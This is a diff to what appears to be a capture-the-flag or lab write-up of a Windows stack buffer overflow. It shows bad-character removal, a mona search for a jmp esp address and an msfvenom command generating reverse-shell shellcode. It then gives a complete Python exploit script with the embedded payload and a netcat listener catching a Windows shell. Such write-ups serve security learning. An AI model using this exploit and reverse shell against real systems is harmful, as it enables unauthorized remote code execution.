@@ -343,3 +343,121 @@ I use this address of 015E19F8 to comapre the two byte arrays
 ![image](https://user-images.githubusercontent.com/83407557/185807012-91666bea-9c8f-4d2a-bea2-42f9b86fa54a.png)
 
 
+I remove \x0a from both arrays and resend:
+
+![image](https://user-images.githubusercontent.com/83407557/185807142-04430f2d-21bd-45bd-a938-58126bb1ac65.png)
+
+After both \x00\x0a were removed It seems the rest of the array can go through with no problem:
+
+![image](https://user-images.githubusercontent.com/83407557/185807204-cbcd40e6-e85c-483e-badb-d0ed49edecbe.png)
+
+
+# finding jmp esp address
+
+I can now see if there are any jmp esp instructios that will not contain the badchars
+
+`!mona jmp -r esp -cpb "\x00\x0a"`
+
+I find two pointers 
+
+![image](https://user-images.githubusercontent.com/83407557/185808329-e5ef54cd-f969-4b98-a75c-a52d20f380b5.png)
+
+
+I can either try address
+
+\xc3\x14\x04\x08
+
+or
+
+\xbf\x16\x04\x08
+
+
+I will try the first one and generate shellcode with msfvenom
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 EXITFUNC=thread -b "\x00\x0a" -f c > shellcode_53
+
+```
+
+Making the payload with jump esp retn address and a NOP sleed for padding
+
+```python
+#!/usr/bin/env python2
+# exploit.py
+
+import socket
+import sys
+
+# setup the Target's IP and port.
+RHOST = "10.10.100.55"
+RPORT = 31337
+
+# create a TCP connection (socket)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+# The payload
+
+padding = "\x90" * 16
+offset = 146
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"
+payload = ("\xbb\x17\xbe\x16\xd5\xdb\xc0\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x52\x31\x58\x12\x83\xe8\xfc\x03\x4f\xb0\xf4\x20\x93\x24\x7a"
+"\xca\x6b\xb5\x1b\x42\x8e\x84\x1b\x30\xdb\xb7\xab\x32\x89\x3b"
+"\x47\x16\x39\xcf\x25\xbf\x4e\x78\x83\x99\x61\x79\xb8\xda\xe0"
+"\xf9\xc3\x0e\xc2\xc0\x0b\x43\x03\x04\x71\xae\x51\xdd\xfd\x1d"
+"\x45\x6a\x4b\x9e\xee\x20\x5d\xa6\x13\xf0\x5c\x87\x82\x8a\x06"
+"\x07\x25\x5e\x33\x0e\x3d\x83\x7e\xd8\xb6\x77\xf4\xdb\x1e\x46"
+"\xf5\x70\x5f\x66\x04\x88\x98\x41\xf7\xff\xd0\xb1\x8a\x07\x27"
+"\xcb\x50\x8d\xb3\x6b\x12\x35\x1f\x8d\xf7\xa0\xd4\x81\xbc\xa7"
+"\xb2\x85\x43\x6b\xc9\xb2\xc8\x8a\x1d\x33\x8a\xa8\xb9\x1f\x48"
+"\xd0\x98\xc5\x3f\xed\xfa\xa5\xe0\x4b\x71\x4b\xf4\xe1\xd8\x04"
+"\x39\xc8\xe2\xd4\x55\x5b\x91\xe6\xfa\xf7\x3d\x4b\x72\xde\xba"
+"\xac\xa9\xa6\x54\x53\x52\xd7\x7d\x90\x06\x87\x15\x31\x27\x4c"
+"\xe5\xbe\xf2\xc3\xb5\x10\xad\xa3\x65\xd1\x1d\x4c\x6f\xde\x42"
+"\x6c\x90\x34\xeb\x07\x6b\xdf\x1e\xde\x3e\x39\x77\xdc\xc0\x45"
+"\xb2\x69\x26\x2f\xac\x3f\xf1\xd8\x55\x1a\x89\x79\x99\xb0\xf4"
+"\xba\x11\x37\x09\x74\xd2\x32\x19\xe1\x12\x09\x43\xa4\x2d\xa7"
+"\xeb\x2a\xbf\x2c\xeb\x25\xdc\xfa\xbc\x62\x12\xf3\x28\x9f\x0d"
+"\xad\x4e\x62\xcb\x96\xca\xb9\x28\x18\xd3\x4c\x14\x3e\xc3\x88"
+"\x95\x7a\xb7\x44\xc0\xd4\x61\x23\xba\x96\xdb\xfd\x11\x71\x8b"
+"\x78\x5a\x42\xcd\x84\xb7\x34\x31\x34\x6e\x01\x4e\xf9\xe6\x85"
+"\x37\xe7\x96\x6a\xe2\xa3\xb7\x88\x26\xde\x5f\x15\xa3\x63\x02"
+"\xa6\x1e\xa7\x3b\x25\xaa\x58\xb8\x35\xdf\x5d\x84\xf1\x0c\x2c"
+"\x95\x97\x32\x83\x96\xbd")
+
+buffer = overflow + retn + padding + payload
+
+# build a happy little message followed by a newline
+buf = ""
+buf += buffer
+buf += "\n"
+
+
+# send the happy little message down the socket
+s.send(buf)
+
+# print out what we send
+print "Sent: {0}".format(buf)
+
+# receive some data from the socket
+data = s.recv(1024)
+
+# print out what we received
+print "Received: {0}".format(data)
+
+```
+
+I start a listener on port 53 and run the exploit to get a callback
+
+```
+└─$ sudo nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.77.38] from (UNKNOWN) [10.10.100.55] 49238
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\admin\Desktop>
+
+```
